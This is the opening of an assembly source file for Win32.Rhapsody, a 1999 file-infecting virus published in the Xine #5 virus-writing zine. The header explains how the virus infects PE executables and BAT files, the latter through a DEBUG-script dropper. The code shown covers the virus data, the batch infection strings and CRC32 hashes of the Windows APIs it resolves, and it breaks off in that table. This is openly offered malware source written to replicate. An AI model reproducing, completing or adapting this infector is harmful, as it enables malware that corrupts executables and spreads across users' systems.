<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>rhapsody.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">

</span><span class="sc1">;                                             ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;                                             ³ Xine - issue #5 - Phile 200 ³</span><span class="sc0">
</span><span class="sc1">;                                             ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">




</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÛÛÛÄÛÛÛÄÛÛÛÄÛÛÛÄÛÛÛÄ¿</span><span class="sc0">
</span><span class="sc1">; ÚÄÜÜÜÄÛÛÛÄÛÛÛÄÛÛÛÄÛÛÛÄÙ        [ Win32.Rhapsody   Billy Belcebu/iKX ]</span><span class="sc0">
</span><span class="sc1">; ÀÄÛÛÛÄÛÛÛÛÛÛÄÄÄÛÛÛÛÛÄÄ¿ ÚÄÄÄÄÄÄ[ 2619 bytes    Target - PE/BAT (R3) ]ÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; ÚÄÛÛÛÄÛÛÛÄÛÛÛÄÛÛÛÄÛÛÛÄÙ ³      [ 24/09/99 - Made in Valencia, Spain ]</span><span class="sc0">
</span><span class="sc1">; ÀÄÛÛÛÄÛÛÛÄÛÛÛÄÛÛÛÄÛÛÛÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; [ Introduction ]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Welcome to Rhapsody. It's a runtime infector, that infects PE (EXE/CPL/SCR)</span><span class="sc0">
</span><span class="sc1">; executables, as well  as BAT files. It  infects PE using the File  Mapping,</span><span class="sc0">
</span><span class="sc1">; also BAT files (k00l!!!). Btw, don't expect  optimization on  this virus. I</span><span class="sc0">
</span><span class="sc1">; was bored of that too, so i didn't take care too much in that. The virus is</span><span class="sc0">
</span><span class="sc1">; simple in all its aspects, it has  been developed  to show a possibility to</span><span class="sc0">
</span><span class="sc1">; infect BAT  files in  Win32 viruses. I am  also  thinking of write a multi-</span><span class="sc0">
</span><span class="sc1">; platform virus via batch files, but i still don't know if it'll be worth to</span><span class="sc0">
</span><span class="sc1">; do that effort (because i  forgot *ALL* about DOS  coding, anything else ;)</span><span class="sc0">
</span><span class="sc1">; If you ask  me for  any parameter  of the Int21h and i wouldn't be  able to</span><span class="sc0">
</span><span class="sc1">; answer ;)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; [ PE infection ]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; I've rebuilded my way of approaching the  infection of the PE file a little</span><span class="sc0">
</span><span class="sc1">; since my previous viruses. Even though, i've decided not to make the infec-</span><span class="sc0">
</span><span class="sc1">; ted file to preserve its  attributes, its time, etc. Well, the PE files are</span><span class="sc0">
</span><span class="sc1">; infected via two different  ways, depending of  the existence of the .reloc</span><span class="sc0">
</span><span class="sc1">; section. Both methods have in common the  fact that i nulify all the fixups</span><span class="sc0">
</span><span class="sc1">; in the PE header, for avoid problems.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; If .reloc section is the last,what we do is to change it's name to Rhapsody</span><span class="sc0">
</span><span class="sc1">; and later we fill with proper data all  the section fields. We make the EIP</span><span class="sc0">
</span><span class="sc1">; (of the PE header) to point to the virus code, and that's all. In some lar-</span><span class="sc0">
</span><span class="sc1">; ge files, the file won't grow, because  the .reloc is  even bigger than the</span><span class="sc0">
</span><span class="sc1">; virus code. Thanx to b0z0/iKX for his great  tute 'Ideas and theoryes on PE</span><span class="sc0">
</span><span class="sc1">; infection',that has been of great help in this part of the virus (the idea,</span><span class="sc0">
</span><span class="sc1">; not the code ;). Even, sometimes, the file size decreases after infection!.</span><span class="sc0">
</span><span class="sc1">; You have an example in explorer.exe :)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; If .reloc isn't  the last section, we infect  the file via the usual method</span><span class="sc0">
</span><span class="sc1">; of increase  the  last  section size, the so called  29A technique (damn, i</span><span class="sc0">
</span><span class="sc1">; don't like  to say so, but it's the  real truth: Jacky  invented it, and we</span><span class="sc0">
</span><span class="sc1">; must call that method as the author wanted... he deserves it!). </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; [ BAT infection ]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; I imagine you are wondering how the fuck i infect the BAT files. Well, it's</span><span class="sc0">
</span><span class="sc1">; very easy: using DEBUG. So, the infected BAT files will be as follows:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; @echo off</span><span class="sc0">
</span><span class="sc1">; goto over_script</span><span class="sc0">
</span><span class="sc1">; N C:\RHAPSODY.SYS</span><span class="sc0">
</span><span class="sc1">; E 0000 12 D3 3A 9F DA CB BB 5A 7A DE 32 7F 23 12 DB AF</span><span class="sc0">
</span><span class="sc1">; E 0010 DA CB BB 5A 7A DE 32 7F 23 12 DB AF D3 3A 9F DA</span><span class="sc0">
</span><span class="sc1">; [...]</span><span class="sc0">
</span><span class="sc1">; RCX</span><span class="sc0">
</span><span class="sc1">; 0A37</span><span class="sc0">
</span><span class="sc1">; W</span><span class="sc0">
</span><span class="sc1">; Q</span><span class="sc0">
</span><span class="sc1">; :over_script</span><span class="sc0">
</span><span class="sc1">; debug &lt; 0% &gt;nul</span><span class="sc0">
</span><span class="sc1">; copy C:\RHAPSODY.SYS C:\RHAPSODY.EXE &gt;nul</span><span class="sc0">
</span><span class="sc1">; C:\RHAPSODY.EXE &gt;nul</span><span class="sc0">
</span><span class="sc1">; del C:\RHAPSODY.SYS &gt;nul</span><span class="sc0">
</span><span class="sc1">; del C:\RHAPSODY.EXE &gt;nul</span><span class="sc0">
</span><span class="sc1">; echo on</span><span class="sc0">
</span><span class="sc1">; ... Old BAT code goes here ...</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Of course, all the  values here  are invented. What  we'll drop at the file</span><span class="sc0">
</span><span class="sc1">; C:\RHAPSODY.SYS is an infected copy of Win32.Rhapsody. We will rename it to</span><span class="sc0">
</span><span class="sc1">; EXE, so we are able  execute it, and finally we  execute it. After that, we</span><span class="sc0">
</span><span class="sc1">; delete both RHAPSODY.SYS and RHAPSODY.EXE. The problem could be in DOS, be-</span><span class="sc0">
</span><span class="sc1">; cause our dropper is a Win32 executable, so  the message 'This program must</span><span class="sc0">
</span><span class="sc1">; be run in Win32' could appear, but i  avoided it: as the  dos stub is a dos</span><span class="sc0">
</span><span class="sc1">; program (showing a lame message) we can  redirect it to NUL device as well.</span><span class="sc0">
</span><span class="sc1">; So, if the BAT file is executed in DOS, nothing would  happen, but if it is</span><span class="sc0">
</span><span class="sc1">; executed in a  Win32  enviroment, the virus  dropper  will  be  executed ;)</span><span class="sc0">
</span><span class="sc1">; The virus doesn't reinfect the file, it  checks  at  the beginning for  the</span><span class="sc0">
</span><span class="sc1">; smilie at the beginning of the batch ':D'</span><span class="sc0">
</span><span class="sc1">; This thing of BAT infection don't pretend to make the virus to be  more wi-</span><span class="sc0">
</span><span class="sc1">; despread, it's only one thing i had in mind and i wanted to add.Just a cool</span><span class="sc0">
</span><span class="sc1">; feature for be seen in an AVPVE description, don't you think? :)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; My algorithm of  BAT  infection  is a  bit messy: it  requires  many memory</span><span class="sc0">
</span><span class="sc1">; allocations and deallocations, the code  is ununderstandable and  had to be</span><span class="sc0">
</span><span class="sc1">; rebuilt many  times. So, don't  try  to copy  code from  there, it's almost</span><span class="sc0">
</span><span class="sc1">; impossible (even I, the  maker of  the code, use  to be  lost when taking a</span><span class="sc0">
</span><span class="sc1">; look to it).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The bad point of  this method  is the  speed while  creating the dr0pper of</span><span class="sc0">
</span><span class="sc1">; debug, and the fact that  we depend  of such executable. Well, it's present</span><span class="sc0">
</span><span class="sc1">; even in NT, so i think there won't be any problem.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; [ Why Rhapsody? ]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This has two parts: why i made  the virus, and why i called it in that way.</span><span class="sc0">
</span><span class="sc1">; Let's do it step by step.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; I was a bit tired of megainfectors (really, spend  almost one month develo-</span><span class="sc0">
</span><span class="sc1">; ping my Win32.Legacy has toasted my few neurons), and i  was in  a day with</span><span class="sc0">
</span><span class="sc1">; a lack of ideas (it's not normal  in me, almost  everyday i am thinking new</span><span class="sc0">
</span><span class="sc1">; ideas for my viruses), so i began to  drink some vodka, tequila, etc (fina-</span><span class="sc0">
</span><span class="sc1">; lly i ended  with the blessed  kalimotxo, i hadn't more  money!), and smoke</span><span class="sc0">
</span><span class="sc1">; that coolio thing called... guess how? yeah, ganja. ;) The day  after, with</span><span class="sc0">
</span><span class="sc1">; the fucking headache i had, i went to my swimming pool (i was at my holyday</span><span class="sc0">
</span><span class="sc1">; place, where i written my Legacy, and my  guides for MS-DOS and Win32), and</span><span class="sc0">
</span><span class="sc1">; the idea come to my mind suddendly  while i was in the cold water. I had to</span><span class="sc0">
</span><span class="sc1">; write a Win32/BAT virus :) </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; About the name, if you know  a bit the scene of epic/medieval metal, you'll</span><span class="sc0">
</span><span class="sc1">; surely heard that band called Rhapsody (hi Inty!). They've excellent songs,</span><span class="sc0">
</span><span class="sc1">; such as that hymn called 'Emerald Sword'. If you hear them you'll experime-</span><span class="sc0">
</span><span class="sc1">; nt a travel to a place where dragons  scare the humans, where is a war bet-</span><span class="sc0">
</span><span class="sc1">; ween the good and  the bad, where the  honour has the same value of a human</span><span class="sc0">
</span><span class="sc1">; life. Ok, adventurer. You that  ride  the  winds  of  wisdom... Defeat  the</span><span class="sc0">
</span><span class="sc1">; master of chaos in the name of the honor and justice!</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; [ Greetings ]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Mmm... this time i will only greet all the iKX crew, Benny/29A &amp; Qozah/29A,</span><span class="sc0">
</span><span class="sc1">; because the friendship  they demonstrated across hard  times. Thanx you all</span><span class="sc0">
</span><span class="sc1">; guys. I'd give all for you, you know. And a greet here to ULTRAS/[MaTRiX],</span><span class="sc0">
</span><span class="sc1">; coz he betatested this, and notified me a minor thing i forgot to do :P</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; (c) 1999 Billy Belcebu/iKX</span><span class="sc0">

        </span><span class="sc2">.586p</span><span class="sc0">
        </span><span class="sc9">.model</span><span class="sc0">  </span><span class="sc10">flat</span><span class="sc4">,</span><span class="sc10">stdcall</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">ShellAboutA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">GetLastError</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">

                </span><span class="sc9">.data</span><span class="sc0">

</span><span class="sc5">szMessage1</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Win32.Rhapsody v1.00#Win32.Rhapsody"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">szMessage2</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"(C) 1999 Billy Belcebu/iKX"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc9">.code</span><span class="sc0">

</span><span class="sc5">W32Rhapsody</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">virus</span><span class="sc0">
</span><span class="sc5">FakeHost</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ShellAboutA</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szMessage1</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szMessage2</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ExitProcess</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc1">; [ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ]</span><span class="sc0">
</span><span class="sc1">; [ Win32.Rhapsody                                                          ]</span><span class="sc0">
</span><span class="sc1">; [ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ]</span><span class="sc0">

</span><span class="sc5">Rhapsody</span><span class="sc0">        </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">use32</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'Rhapsody'</span><span class="sc0">

</span><span class="sc5">d</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">&lt;[</span><span class="sc8">ebp</span><span class="sc4">]-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc4">&gt;</span><span class="sc0">

</span><span class="sc5">virus_size</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">virus_end</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc0">
</span><span class="sc5">heap_size</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">heap_end</span><span class="sc4">-</span><span class="sc5">virus_end</span><span class="sc0">
</span><span class="sc5">total_size</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">virus_size</span><span class="sc4">+</span><span class="sc5">heap_size</span><span class="sc0">

</span><span class="sc5">virus_start</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">virus</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">over_virus_data</span><span class="sc0">

</span><span class="sc1">; [ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ]</span><span class="sc0">
</span><span class="sc1">; [ Some virus data                                                         ]</span><span class="sc0">
</span><span class="sc1">; [ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ]</span><span class="sc0">

</span><span class="sc5">bat_inf1</span><span class="sc0">        </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">":D"</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">              </span><span class="sc1">; &lt;-- Inf mark ;)</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"@echo off"</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"goto over_script"</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"N C:\RHAPSODY.SYS"</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc5">n_bat_inf1</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">bat_inf1</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">bat_inf2</span><span class="sc0">        </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"RCX"</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc5">src_bytes</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"0000"</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"W"</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Q"</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">":over_script"</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"debug &lt;%0 &gt;nul"</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"copy C:\RHAPSODY.SYS C:\RHAPSODY.EXE &gt;nul"</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"C:\RHAPSODY.EXE &gt;nul"</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"del C:\RHAPSODY.SYS &gt;nul"</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"del C:\RHAPSODY.EXE &gt;nul"</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"echo on"</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc5">n_bat_inf2</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">bat_inf2</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">temp_file</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"RHAPSODY.W32"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">SEARCH_MASK</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"*.*"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">AddressTableVA</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">NameTableVA</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">OrdinalTableVA</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">kernel</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">TmpModuleBase</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">lpThreadId</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">GlobalAllocHandle</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">GlobalAllocHandle2</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">GlobalAllocHandle3</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">SearchHandle</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">FileHandle</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">FileHandle2</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">FileHandle3</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">MapAddress</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">MapAddress2</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">MapHandle</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">MapHandle2</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">NumOfBytesWritten</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">InfDropperSize</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">Counter</span><span class="sc0">                 </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0">

</span><span class="sc5">over_virus_data</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">; [ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ]</span><span class="sc0">
</span><span class="sc1">; [ Get delta offset :)                                                     ]</span><span class="sc0">
</span><span class="sc1">; [ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">delta</span><span class="sc0">
</span><span class="sc5">delta</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">

</span><span class="sc1">; [ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ]</span><span class="sc0">
</span><span class="sc1">; [ CRC32 of APIs used by the virus                                         ]</span><span class="sc0">
</span><span class="sc1">; [ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ]</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">over_virus_apis</span><span class="sc0">

</span><span class="sc5">apiCRC32</span><span class="sc0">                </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">@FindFirstFileA</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0AE17EBEFh</span><span class="sc0">
</span><span class="sc5">@FindNextFileA</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0AA700106h</span><span class="sc0">
</span><span class="sc5">@FindClose</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0C200BE21h</span><span class="sc0">
</span><span class="sc5">@CreateFileA</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">08C892DDFh</span><span class="sc0">
</span><span class="sc5">@DeleteFileA</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0DE256FDEh</span><span class="sc0">
</span><span class="sc5">@SetFilePointer</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">085859D42h</span><span class="sc0">
</span><span class="sc5">@SetFileAttributesA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">03C19E536h</span><span class="sc0">
</span><span class="sc5">@CloseHandle</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">068624A9Dh</span><span class="sc0">
</span><span class="sc5">@GetCurrentDirectoryA</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0EBC6C18Bh</span><span class="sc0">
</span><span class="sc5">@SetCurrentDirectoryA</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0B2DBD7DCh</span><span class="sc0">
</span><span class="sc5">@GetWindowsDirectoryA</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0FE248274h</span><span class="sc0">
</span><span class="sc5">@GetSystemDirectoryA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0593AE7CEh</span><span class="sc0">
</span><span class="sc5">@CreateFileMappingA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">096B2D96Ch</span><span class="sc0">
</span><span class="sc5">@MapViewOfFile</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0797B49ECh</span><span class="sc0">
</span><span class="sc5">@UnmapViewOfFile</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">094524B42h</span><span class="sc0">
</span><span class="sc5">@SetEndOfFile</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">059994ED6h</span><span class="sc0">
</span><span class="sc5">@GetFileSize</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0EF7D811Bh</span><span class="sc0">
</span><span class="sc5">@ReadFile</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">054D8615Ah</span><span class="sc0">
</span><span class="sc5">@WriteFile</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">021777793h</span><span class="sc0">
</span><span class="sc5">@CreateThread</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">019F33607h</span><span class="sc0">
</span><span class="sc5">@ExitThread</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0058F9201h</span><span class="sc0">
